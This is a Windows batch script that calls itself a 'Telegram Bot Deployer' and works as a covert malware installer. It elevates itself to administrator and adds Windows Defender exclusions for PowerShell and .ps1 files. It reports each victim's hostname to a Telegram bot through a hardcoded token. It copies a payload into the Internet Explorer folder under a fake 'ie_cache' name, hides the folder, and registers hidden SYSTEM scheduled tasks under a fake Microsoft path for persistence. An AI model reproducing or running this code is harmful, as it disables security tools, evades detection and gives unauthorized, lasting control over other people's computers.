@echo off
title Telegram Bot Deployer - COMBINED (AUTO)
color 0A

:: ============================================================
:: SINGLE ELEVATION FOR BOTH DEPLOYERS
:: ============================================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

setlocal enabledelayedexpansion
set "SCRIPT_DIR=%~dp0"

echo ========================================
echo    COMBINED TELEGRAM BOT DEPLOYER
echo ========================================
echo.
echo  AUTO MODE - no user interaction required
echo    Stage 1) startForAll.bat (Lab picker + ComputerID)
echo    Stage 2) start.bat       (T*.ps1 picker)
echo.
echo ========================================
echo.

:: ============================================================
:: ============================================================
:: PART 1 - ORIGINAL startForAll.bat LOGIC  (AUTO)
:: ============================================================
:: ============================================================
echo ########################################
echo # STAGE 1 / 2 : startForAll (Labs)     #
echo ########################################
echo.

powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue" >nul 2>&1

echo [INFO] Defender exclusions added.
echo.
echo [INFO] Scanning for deployment scripts...
echo.

set "TOTAL=0"

:: ---- BUILD MENU IN ONE PASS ----
set "MENU_FILE=%TEMP%\tg_menu_%RANDOM%.txt"
if exist "%MENU_FILE%" del "%MENU_FILE%" >nul 2>&1

:: ---- TEDI ----
set "TEDI_LIST="
if exist "%SCRIPT_DIR%M01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=M01.ps1" & set "LBL_!TOTAL!=Tedi Lab 1" & set "TEDI_LIST=!TEDI_LIST!!TOTAL!|M01.ps1|Tedi Lab 1\n")
if exist "%SCRIPT_DIR%M02.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=M02.ps1" & set "LBL_!TOTAL!=Tedi Lab 2" & set "TEDI_LIST=!TEDI_LIST!!TOTAL!|M02.ps1|Tedi Lab 2\n")
if exist "%SCRIPT_DIR%M03.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=M03.ps1" & set "LBL_!TOTAL!=Tedi Lab 3" & set "TEDI_LIST=!TEDI_LIST!!TOTAL!|M03.ps1|Tedi Lab 3\n")
if exist "%SCRIPT_DIR%M04.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=M04.ps1" & set "LBL_!TOTAL!=Tedi Lab 4" & set "TEDI_LIST=!TEDI_LIST!!TOTAL!|M04.ps1|Tedi Lab 4\n")
if exist "%SCRIPT_DIR%V01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=V01.ps1" & set "LBL_!TOTAL!=Veterinary" & set "TEDI_LIST=!TEDI_LIST!!TOTAL!|V01.ps1|Veterinary\n")

:: ---- FASIL ----
set "FASIL_LIST="
if exist "%SCRIPT_DIR%F01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F01.ps1" & set "LBL_!TOTAL!=Fasil Lab 1" & set "FASIL_LIST=!FASIL_LIST!!TOTAL!|F01.ps1|Fasil Lab 1\n")
if exist "%SCRIPT_DIR%F02.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F02.ps1" & set "LBL_!TOTAL!=Fasil Lab 2" & set "FASIL_LIST=!FASIL_LIST!!TOTAL!|F02.ps1|Fasil Lab 2\n")
if exist "%SCRIPT_DIR%F03.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F03.ps1" & set "LBL_!TOTAL!=Fasil Lab 3" & set "FASIL_LIST=!FASIL_LIST!!TOTAL!|F03.ps1|Fasil Lab 3\n")
if exist "%SCRIPT_DIR%F04.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F04.ps1" & set "LBL_!TOTAL!=Fasil Lab 4" & set "FASIL_LIST=!FASIL_LIST!!TOTAL!|F04.ps1|Fasil Lab 4\n")
if exist "%SCRIPT_DIR%F05.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F05.ps1" & set "LBL_!TOTAL!=Fasil Lab 5" & set "FASIL_LIST=!FASIL_LIST!!TOTAL!|F05.ps1|Fasil Lab 5\n")
if exist "%SCRIPT_DIR%F06.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=F06.ps1" & set "LBL_!TOTAL!=Fasil Lab 6" & set "FASIL_LIST=!FASIL_LIST!!TOTAL!|F06.ps1|Fasil Lab 6\n")

:: ---- MARAKI ----
set "MARAKI_LIST="
if exist "%SCRIPT_DIR%FB01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=FB01.ps1" & set "LBL_!TOTAL!=Maraki FB" & set "MARAKI_LIST=!MARAKI_LIST!!TOTAL!|FB01.ps1|Maraki FB\n")
if exist "%SCRIPT_DIR%MA01.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=MA01.ps1" & set "LBL_!TOTAL!=Maraki Lab 1" & set "MARAKI_LIST=!MARAKI_LIST!!TOTAL!|MA01.ps1|Maraki Lab 1\n")
if exist "%SCRIPT_DIR%MA02.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=MA02.ps1" & set "LBL_!TOTAL!=Maraki Lab 2" & set "MARAKI_LIST=!MARAKI_LIST!!TOTAL!|MA02.ps1|Maraki Lab 2\n")
if exist "%SCRIPT_DIR%MA03.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=MA03.ps1" & set "LBL_!TOTAL!=Maraki Lab 3" & set "MARAKI_LIST=!MARAKI_LIST!!TOTAL!|MA03.ps1|Maraki Lab 3\n")
if exist "%SCRIPT_DIR%MA04.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=MA04.ps1" & set "LBL_!TOTAL!=Maraki Lab 4" & set "MARAKI_LIST=!MARAKI_LIST!!TOTAL!|MA04.ps1|Maraki Lab 4\n")
if exist "%SCRIPT_DIR%FB.ps1" (set /a TOTAL+=1 & set "OPT_!TOTAL!=FB.ps1" & set "LBL_!TOTAL!=Maraki FB" & set "MARAKI_LIST=!MARAKI_LIST!!TOTAL!|FB.ps1|Maraki FB\n")

:: ============================================================
:: RENDER ALL COLORED MENU LINES IN A SINGLE POWERSHELL CALL
:: ============================================================
powershell -NoProfile -Command ^
  "$tedi='!TEDI_LIST!'; $fasil='!FASIL_LIST!'; $maraki='!MARAKI_LIST!';" ^
  "function Show($title,$color,$list){ if($list -eq ''){return}; Write-Host '==================' -ForegroundColor $color; Write-Host $title -ForegroundColor $color; Write-Host '==================' -ForegroundColor $color; foreach($line in ($list -split \"`n\")){ if($line.Trim() -eq ''){continue}; $p=$line -split '\|'; Write-Host ('  [' + $p[0] + '] ' + $p[2] + ' (' + $p[1] + ')') -ForegroundColor $color } }" ^
  "Show 'TEDI LABS' 'Green' $tedi; Show 'FASIL LABS' 'Blue' $fasil; Show 'MARAKI LABS' 'Red' $maraki"

echo.
echo ========================================

if %TOTAL% equ 0 (
    echo.
    echo [ERROR] No deployment scripts found!
    echo.
    echo Please make sure at least one script exists:
    echo.
    echo   TEDI:    M01.ps1, M02.ps1, M03.ps1, M04.ps1, V01.ps1
    echo   FASIL:   F01.ps1, F02.ps1, F03.ps1, F04.ps1, F05.ps1, F06.ps1
    echo   MARAKI:  FB01.ps1, MA01.ps1, MA02.ps1, MA03.ps1, MA04.ps1
    echo.
    timeout /t 5 /nobreak >nul
    exit /b 1
)

:: ============================================================
:: AUTO-SELECT FIRST AVAILABLE LAB SCRIPT (no prompt)
:: ============================================================
set "CHOICE=1"
echo.
echo [AUTO] No user interaction - selecting first available option: !CHOICE! of %TOTAL%

if "%CHOICE%" lss "1" goto :invalid_sfa
if "%CHOICE%" gtr "%TOTAL%" goto :invalid_sfa

for %%i in (%CHOICE%) do (
    set "SELECTED=!OPT_%%i!"
    set "LABEL=!LBL_%%i!"
)

if not defined SELECTED goto :invalid_sfa

set "FOUND_SCRIPT=%SCRIPT_DIR%!SELECTED!"

:: ========================================
:: AUTO COMPUTER ID (no prompt)
:: ========================================
echo.
echo ========================================
echo    COMPUTER IDENTIFICATION
echo ========================================
echo.

set "COMPUTER_ID=%COMPUTERNAME%"
echo [AUTO] ComputerID set to: !COMPUTER_ID!

echo.
echo [INFO] Selected Lab   : !LABEL! (!SELECTED!)
echo [INFO] ComputerID     : !COMPUTER_ID!
echo [INFO] Hostname       : %COMPUTERNAME%
echo [INFO] Deploying...
echo.

:: ========================================
:: CLEAN PREVIOUS DEPLOYMENTS (except systg in AppData)
:: ========================================
echo ========================================
echo    CLEANING PREVIOUS DEPLOYMENTS
echo ========================================
echo.
echo [INFO] Removing old deployment files (preserving 'systg' in AppData)...
echo.

powershell -NoProfile -Command ^
  "$ErrorActionPreference='SilentlyContinue';" ^
  "$removed=0;" ^
  "$protected=@('systg');" ^
  "$targets=@(" ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk\"," ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.vbs\"," ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.bat\"," ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.cmd\"," ^
  "  \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.ps1\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.vbs\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.bat\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.cmd\"," ^
  "  \"$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\*.ps1\"," ^
  "  \"$env:TEMP\*.ps1\"," ^
  "  \"$env:TEMP\*.vbs\"," ^
  "  \"$env:TEMP\*.bat\"," ^
  "  \"$env:TEMP\*.cmd\"," ^
  "  \"$env:TEMP\*.lnk\"," ^
  "  \"C:\ProgramData\WindowUpdate\*\"," ^
  "  \"$env:LOCALAPPDATA\Temp\*.ps1\"," ^
  "  \"$env:LOCALAPPDATA\Temp\*.vbs\"," ^
  "  \"$env:LOCALAPPDATA\Temp\*.bat\"" ^
  ");" ^
  "foreach($t in $targets){" ^
  "  Get-Item $t -ErrorAction SilentlyContinue | ForEach-Object {" ^
  "    $n=$_.Name;" ^
  "    $skip=$false;" ^
  "    foreach($p in $protected){ if($n -like \"*$p*\"){ $skip=$true; break } }" ^
  "    if(-not $skip){ Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue; if(-not (Test-Path $_.FullName)){ $removed++ } }" ^
  "  }" ^
  "};" ^
  "Write-Host ('  [OK] Removed ' + $removed + ' old deployment file(s).') -ForegroundColor Yellow;" ^
  "Write-Host '  [OK] Preserved: systg folder in AppData.' -ForegroundColor Green"

:: Also clean the C:\ProgramData\WindowUpdate folder contents but keep the folder itself
if exist "C:\ProgramData\WindowUpdate\" (
    for /d %%D in ("C:\ProgramData\WindowUpdate\*") do (
        echo %%D | findstr /i "systg" >nul
        if errorlevel 1 (
            rd /s /q "%%D" >nul 2>&1
        )
    )
)

echo.
echo ========================================
echo    CLEANUP COMPLETE - STARTING DEPLOYMENT
echo ========================================
echo.

:: ========================================
:: SEND IDENTIFICATION TO TELEGRAM
:: ========================================
powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"MACHINE IDENTIFIED`n`n----------------------`nLab        : !LABEL!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"

echo [INFO] Identification sent to Telegram.
echo.

:: ========================================
:: DEPLOY
:: ========================================
powershell -NoProfile -ExecutionPolicy Bypass -File "%FOUND_SCRIPT%"

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT SUCCESSFUL!' -ForegroundColor Green"
    echo ========================================
    echo.
    echo [INFO] Deployed on host: %COMPUTERNAME%
    echo [INFO] ComputerID      : !COMPUTER_ID!
    echo.

    powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"DEPLOYMENT SUCCESSFUL`n`n----------------------`nLab        : !LABEL!`nScript     : !SELECTED!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"

    echo [INFO] Telegram notification sent.
    echo.
) else (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT FAILED!' -ForegroundColor Red"
    echo ========================================
    echo.

    powershell -Command "$token = '8425297013:AAG42OM97dT64vT9V4CVkiF-0n9nCqP8BSI'; $chat = '7303070402'; $msg = \"DEPLOYMENT FAILED`n`n----------------------`nLab        : !LABEL!`nScript     : !SELECTED!`nComputerID : !COMPUTER_ID!`nHostname   : %COMPUTERNAME%`nTime       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n----------------------\"; $uri = 'https://api.telegram.org/bot' + $token + '/sendMessage'; Invoke-RestMethod -Uri $uri -Method Post -Body @{chat_id=$chat; text=$msg} | Out-Null"

    echo [INFO] Failure notification sent.
    echo.
)

goto :stage2

:invalid_sfa
echo.
powershell -Command "Write-Host '  [ERROR] Invalid choice. Please enter a number between 1 and %TOTAL%.' -ForegroundColor Red"
echo.
goto :end_all

:: ============================================================
:: ============================================================
:: PART 2 - ORIGINAL start.bat LOGIC  (T*.ps1 picker)  (AUTO)
:: ============================================================
:: ============================================================
:stage2
echo.
echo ########################################
echo # STAGE 2 / 2 : start.bat (T*.ps1 Bots) #
echo ########################################
echo.

set "TARGET_DIR=%ProgramFiles%\Internet Explorer"
set "LOG=%TEMP%\deploy_log.txt"
echo Deployment started %DATE% %TIME% > "%LOG%"

echo ========================================
echo  Telegram Bot Deployer
echo ========================================
echo.

:: --- Scan for T*.ps1 files ---
set "COUNT=0"
for %%F in ("%SCRIPT_DIR%T*.ps1") do (
    set /a COUNT+=1
    set "FILE_!COUNT!=%%~fF"
    set "NAME_!COUNT!=%%~nF"
)

if %COUNT%==0 (
    echo [ERROR] No T*.ps1 files found in:
    echo         %SCRIPT_DIR%
    echo.
    echo Files in that folder:
    dir /b "%SCRIPT_DIR%"
    echo.
    goto :end_all
)

echo Found %COUNT% script^(s^):
echo.
for /L %%I in (1,1,%COUNT%) do (
    echo   [%%I] !NAME_%%I!
)
echo.
echo   [0] Exit
echo.

:: ============================================================
:: AUTO-SELECT FIRST T*.ps1 (no prompt)
:: ============================================================
set "CHOICE=1"
echo [AUTO] No user interaction - auto-selecting first T*.ps1: !NAME_1!
echo.

if "%CHOICE%"=="" goto CHOOSE
if "%CHOICE%"=="0" goto :end_all

echo %CHOICE%| findstr /r "^[0-9][0-9]*$" >nul
if errorlevel 1 (
    echo Invalid choice.
    goto :end_all
)
if %CHOICE% LSS 1 goto :end_all
if %CHOICE% GTR %COUNT% goto :end_all

set "BOT_TAG=!NAME_%CHOICE%!"
set "SOURCE_PS1=!FILE_%CHOICE%!"
set "TARGET_PS1=%TARGET_DIR%\ie_cache_%BOT_TAG%.ps1"
set "TASK_NAME=%COMPUTERNAME%_%BOT_TAG%_Bot"
set "STARTUP_TASK_NAME=%COMPUTERNAME%_%BOT_TAG%_Startup"
set "TASK_PATH=\Microsoft\Windows\Install\%TASK_NAME%"
set "STARTUP_TASK_PATH=\Microsoft\Windows\Install\%STARTUP_TASK_NAME%"

echo.
echo ========================================
echo  Deploying [%BOT_TAG%]
echo ========================================
echo.

echo [1/8] Preparing target directory...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" 2>nul
attrib -h -s "%TARGET_DIR%" 2>nul

echo [2/8] Deploying PowerShell script as ie_cache_%BOT_TAG%.ps1 ...
copy /Y "%SOURCE_PS1%" "%TARGET_PS1%" >nul
if %errorLevel% neq 0 (
    echo [ERROR] Failed to copy script.
    goto :end_all
)

echo [3/8] Adding Windows Defender exclusions...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'; Add-MpPreference -ExclusionPath '%TARGET_PS1%'; Add-MpPreference -ExclusionProcess 'powershell.exe'" 2>nul

echo [4/8] Hiding folder...
attrib +h +s "%TARGET_DIR%"

echo [5/8] Creating Task Scheduler folder structure...
powershell -NoProfile -Command ^
    "$s = New-Object -ComObject 'Schedule.Service'; $s.Connect();" ^
    "$root = $s.GetFolder('\');" ^
    "function Ensure-Folder($parent, $path) {" ^
    "  $parts = $path -split '\\\\' | Where-Object { $_ -ne '' };" ^
    "  $cur = $parent;" ^
    "  foreach ($p in $parts) {" ^
    "    try { $cur = $cur.GetFolder($p) } catch { $cur = $cur.CreateFolder($p) }" ^
    "  }" ^
    "}" ^
    "Ensure-Folder $root 'Microsoft\\Windows\\Install'" 2>nul

:: ---------- Task 1: Startup ----------
echo [6/8] Creating startup task...
schtasks /Delete /TN "%STARTUP_TASK_PATH%" /F >nul 2>&1

schtasks /Create /TN "%STARTUP_TASK_PATH%" /TR "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TARGET_PS1%\"" /SC ONSTART /DELAY 0001:00 /RL HIGHEST /RU SYSTEM /F >nul

if %errorLevel% neq 0 (
    echo [WARNING] Startup task with SYSTEM account failed - retrying without delay...
    schtasks /Create /TN "%STARTUP_TASK_PATH%" /TR "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TARGET_PS1%\"" /SC ONSTART /RL HIGHEST /RU SYSTEM /F >nul
)

if %errorLevel% neq 0 (
    echo [ERROR] Failed to create startup task.
    goto :end_all
)

:: ---------- Task 2: Watchdog (15 min) ----------
echo [7/8] Creating watchdog task ^(every 15 minutes^)...
schtasks /Delete /TN "%TASK_PATH%" /F >nul 2>&1

schtasks /Create /TN "%TASK_PATH%" /TR "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TARGET_PS1%\"" /SC MINUTE /MO 15 /RL HIGHEST /RU SYSTEM /IT /F >nul

if %errorLevel% neq 0 (
    echo [WARNING] SYSTEM account failed - retrying with current user...
    schtasks /Create /TN "%TASK_PATH%" /TR "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TARGET_PS1%\"" /SC MINUTE /MO 15 /RL HIGHEST /F >nul
)

if %errorLevel% neq 0 (
    echo [ERROR] Failed to create watchdog task.
    goto :end_all
)

:: ---------- Configure both tasks ----------
echo [8/8] Configuring task settings...
powershell -NoProfile -Command ^
    "foreach ($n in @('%TASK_NAME%','%STARTUP_TASK_NAME%')) {" ^
    "  $t = Get-ScheduledTask -TaskPath '\Microsoft\Windows\Install\' -TaskName $n -ErrorAction SilentlyContinue;" ^
    "  if ($t) {" ^
    "    $t.Settings.ExecutionTimeLimit           = 'PT0S';" ^
    "    $t.Settings.RestartCount                 = 3;" ^
    "    $t.Settings.RestartInterval              = 'PT1M';" ^
    "    $t.Settings.MultipleInstances            = 'IgnoreNew';" ^
    "    $t.Settings.DisallowStartIfOnBatteries   = $false;" ^
    "    $t.Settings.StopIfGoingOnBatteries       = $false;" ^
    "    $t.Settings.StartWhenAvailable           = $true;" ^
    "    Set-ScheduledTask -InputObject $t | Out-Null" ^
    "  }" ^
    "}" 2>nul

echo.
echo ========================================
echo  Deployment Complete  [%BOT_TAG%]
echo ========================================
echo  Watchdog (15 min) : %TASK_PATH%
echo  Startup           : %STARTUP_TASK_PATH%
echo  Script            : %TARGET_PS1%
echo ========================================
echo.

echo Starting bot now...
schtasks /Run /TN "%TASK_PATH%" >nul 2>&1

if %errorLevel% equ 0 (
    echo [OK] Task started.
) else (
    echo [WARN] Could not start task - launching directly...
    start "" /B powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TARGET_PS1%"
)

:: ============================================================
:: ============================================================
:: DONE
:: ============================================================
:: ============================================================
:end_all
echo.
echo ========================================
echo  ALL DEPLOYMENTS FINISHED
echo ========================================
echo ----------------------------------------
echo Done. Auto-closing in 5 seconds...
echo ----------------------------------------
timeout /t 5 /nobreak >nul
exit /b 0